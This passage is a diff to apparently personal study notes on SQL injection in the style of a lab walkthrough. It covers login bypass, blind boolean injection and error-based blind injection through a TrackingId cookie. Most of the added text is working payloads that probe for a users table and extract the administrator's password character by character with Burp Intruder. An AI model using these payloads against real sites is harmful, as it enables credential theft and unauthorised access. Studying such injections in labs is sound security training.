@@ -26,7 +26,7 @@ Regular:
 
 Modified:
 
-`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`
+`SELECT * FROM users WHERE username = 'administrator'--' AND password = ''`` `**`//username = administrator'-- | password = <empty string>`**
 
 ### **SQL injection UNION attacks**
 
@@ -177,4 +177,97 @@ Based off the True and False above, you then give statements to test out what is
 
 `Cookie: TrackingId=lacwN6lFLWfaCu61' AND (SELECT 'a' FROM users LIMIT 1)='a;`
 
-Now you know the **users** table exists, if you get a similar response to True above. To check for a username
+Now you know the **users** table exists, if you get a similar response to True above. To check for a username, you would run the following:
+
+`Cookie: TrackingId=lacwN6lFLWfaCu61' AND (SELECT 'a' FROM users WHERE username='administrator')='a;`
+
+This checks if the username is **administrator**, and if this is true, then you will get the same response as you did for True above.&#x20;
+
+Determine size of **password** value:
+
+`Cookie: TrackingId=lacwN6lFLWfaCu61' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a`` `**`//(password)=1) also works`**
+
+Determine password string (use with Burp Suite Intruder):
+
+`Cookie: TrackingId=lacwN6lFLWfaCu61' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
+
+Modified Cookie with Intruder:
+
+`Cookie: TrackingId=lacwN6lFLWfaCu61' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§;`
+
+{% hint style="info" %}
+Use a wordlist of \[A-Za-z0-9] (special characters as well)
+{% endhint %}
+
+To find second character:
+
+`Cookie: TrackingId=lacwN6lFLWfaCu61' AND (SELECT SUBSTRING(password,2,1) FROM users WHERE username='administrator')='§a§;`
+
+You'll know when you are hitting the mark when you see a Length difference in Burp Suite, or the same response as the True response:
+
+![](<../.gitbook/assets/image (331).png>)
+
+Eventually, you will have the whole string.
+
+### Inducing conditional responses by triggering SQL errors <a href="#inducing-conditional-responses-by-triggering-sql-errors" id="inducing-conditional-responses-by-triggering-sql-errors"></a>
+
+This involves modifying the query so that it will cause a database error if the condition is true, but not if the condition is false.
+
+`xyz' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a`` `**`// = 'a'`**
+
+`xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a`` `**`// = 1/0 error`**
+
+Assuming the error causes some difference in the application's HTTP response, we can use this difference to infer whether the injected condition is true.
+
+`xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a`
+
+To test for vulnerability:
+
+`Cookie: TrackingId=jtQxp6BAmmb6pemr'`
+
+`Cookie: TrackingId=jtQxp6BAmmb6pemr''`
+
+If the error disappears you have a **syntax error**.
+
+To confirm that the server is interpreting the injection as a SQL query i.e. that the error is a SQL syntax error as opposed to any other kind of error:
+
+`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT '')||'`
+
+To test for Oracle databases:
+
+`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT '' FROM dual)||'`
+
+If you do not get an error with the above query, then the DB is Oracle. To make sure SQL query is being processed in the backend, run the following:
+
+Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT '' FROM not-a-real-table)||'
+
+To verify that a users table exists:
+
+`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT '' FROM users WHERE ROWNUM = 1)||'`
+
+To test conditions:
+
+`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' //should give error`
+
+`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||' //should NOT give error`
+
+{% hint style="info" %}
+We get an error when the conditional is True
+{% endhint %}
+
+Check for a username (will result in an error if true):
+
+`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+Size of password:
+
+`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT CASE WHEN LENGTH(password)>20 THEN to_char(1/0) ELSE '' END FROM users WHERE username='administrator')||'`` `**`//LENGTH(password)=20 works as well`**
+
+Check for character at specific location (for BurpSuite Intruder):
+
+`Cookie: TrackingId=jtQxp6BAmmb6pemr'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'`
+
+Again, for this one the error lets you know when you are on the right path:
+
+![](<../.gitbook/assets/image (339).png>)
+
